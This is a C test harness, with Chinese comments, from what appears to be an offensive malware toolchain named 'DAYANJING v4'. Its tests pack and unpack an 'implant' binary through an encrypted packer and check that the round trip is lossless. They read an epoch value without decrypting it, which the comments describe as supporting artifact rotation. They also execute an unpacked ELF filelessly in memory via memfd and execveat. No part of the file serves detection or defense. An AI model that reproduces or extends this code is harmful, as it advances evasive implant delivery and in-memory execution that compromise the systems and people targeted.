/* DAYANJING v4 — 25_deploy / tests/test_deploy.c
 *
 * 验证"生成 -> 打包 -> 解包 -> 落地执行"这条链是真闭环，不是拼装演示。
 *
 * 三条硬断言：
 *  1. 无损：解包字节必须与原始 ELF 逐字节相同。若这里放水，"制品能解开"
 *     会掩盖"解开的东西根本不是原程序"，而后者在真机上表现为随机崩溃。
 *  2. 真执行：用 pk_mexec 真正跑起来（memfd + execveat），不是只验证地址。
 *     静态 ELF 用 mexec_target，避免把完整 implant 跑满时长。
 *  3. epoch 可 O(1) 查询：不解密即可读出纪元，用于制品轮换。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

#include "packer.h"

static int fails = 0;
static int checks = 0;

#define CHECK(cond, msg) do { \
    checks++; \
    if (!(cond)) { fails++; printf("[FAIL] %s\n", msg); } \
    else printf("[PASS] %s\n", msg); \
} while (0)

static const uint8_t DEPLOY_SEED[32] = {
    0x44, 0x41, 0x59, 0x41, 0x4e, 0x4a, 0x49, 0x4e,
    0x47, 0x2d, 0x44, 0x45, 0x50, 0x4c, 0x4f, 0x59,
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
};

static uint8_t *read_file(const char *path, size_t *len)
{
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return NULL; }
    long sz = ftell(f);
    if (sz < 0) { fclose(f); return NULL; }
    rewind(f);
    uint8_t *buf = malloc((size_t)sz);
    if (!buf) { fclose(f); return NULL; }
    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) { free(buf); fclose(f); return NULL; }
    fclose(f);
    *len = (size_t)sz;
    return buf;
}

/* 打包并解包，返回 0 表示无损还原 */
static int roundtrip(const uint8_t *raw, size_t raw_len, uint8_t **unpacked, size_t *unpacked_len)
{
    size_t cap = pk_size_bound_v4(raw_len);
    uint8_t *blob = malloc(cap);
    if (!blob) return -1;
    size_t blen = cap;

    uint8_t bind_id[PK_BIND_ID_LEN];
    uint8_t eph_pub[PK_EPH_PUB_LEN];
    memset(bind_id, 0, sizeof(bind_id));
    memset(eph_pub, 0, sizeof(eph_pub));

    int rc = pk_pack_shaped(raw, raw_len, DEPLOY_SEED, sizeof(DEPLOY_SEED),
                            bind_id, 1u, eph_pub, blob, &blen);
    if (rc != 0) { free(blob); return rc; }

    uint32_t ep = 0;
    if (pk_shaped_epoch(blob, blen, DEPLOY_SEED, sizeof(DEPLOY_SEED), &ep) == 0)
        printf("       epoch=%u (O(1) 查询，未解密)\n", ep);

    uint8_t *out = malloc(raw_len);
    if (!out) { free(blob); return -1; }
    size_t olen = raw_len;
    rc = pk_unpack_shaped(blob, blen, DEPLOY_SEED, sizeof(DEPLOY_SEED), out, &olen);
    free(blob);
    if (rc != 0) { free(out); return rc; }

    *unpacked = out;
    *unpacked_len = olen;
    return 0;
}

static void test_synthetic(void)
{
    uint8_t raw[4096];
    for (size_t i = 0; i < sizeof(raw); i++) raw[i] = (uint8_t)(i * 7 + 3);

    uint8_t *out = NULL; size_t olen = 0;
    int rc = roundtrip(raw, sizeof(raw), &out, &olen);
    CHECK(rc == 0, "合成负载打包/解包返回 OK");
    if (rc == 0) {
        CHECK(olen == sizeof(raw), "合成负载解包长度一致");
        CHECK(memcmp(raw, out, sizeof(raw)) == 0, "合成负载逐字节无损");
        free(out);
    }
}

static void test_real_implant(void)
{
    size_t raw_len = 0;
    uint8_t *raw = read_file("../monolith/implant", &raw_len);
    if (!raw) {
        printf("[SKIP] 未找到 ../monolith/implant（先构建 monolith）\n");
        return;
    }
    printf("       原始 implant: %zu 字节\n", raw_len);

    uint8_t *out = NULL; size_t olen = 0;
    int rc = roundtrip(raw, raw_len, &out, &olen);
    CHECK(rc == 0, "真实 implant 打包/解包返回 OK");
    if (rc == 0) {
        CHECK(olen == raw_len, "真实 implant 解包长度一致");
        CHECK(memcmp(raw, out, raw_len) == 0, "真实 implant 逐字节无损");
        free(out);
    }
    free(raw);
}

static void test_mexec(void)
{
    size_t raw_len = 0;
    uint8_t *raw = read_file("../20_packer/build/mexec_target", &raw_len);
    if (!raw) {
        printf("[SKIP] 未找到 mexec_target（先在 20_packer 执行 make）\n");
        return;
    }

    uint8_t *out = NULL; size_t olen = 0;
    int rc = roundtrip(raw, raw_len, &out, &olen);
    CHECK(rc == 0, "mexec_target 打包/解包返回 OK");
    free(raw);
    if (rc != 0) return;

    pid_t pid = fork();
    if (pid == 0) {
        char *argv[] = { (char *)"mexec_target", NULL };
        pk_mexec(out, olen, argv, NULL);
        _exit(127); /* pk_mexec 成功则不返回 */
    }
    int st = 0;
    waitpid(pid, &st, 0);
    CHECK(WIFEXITED(st) && WEXITSTATUS(st) == 0, "解包后的 ELF 经 pk_mexec 真执行并正常退出");
    free(out);
}

int main(void)
{
    printf("=== 25_deploy 全链路验证 ===\n");
    test_synthetic();
    test_real_implant();
    test_mexec();
    printf("=== %d checks, %d failed ===\n", checks, fails);
    return fails == 0 ? 0 : 1;
}
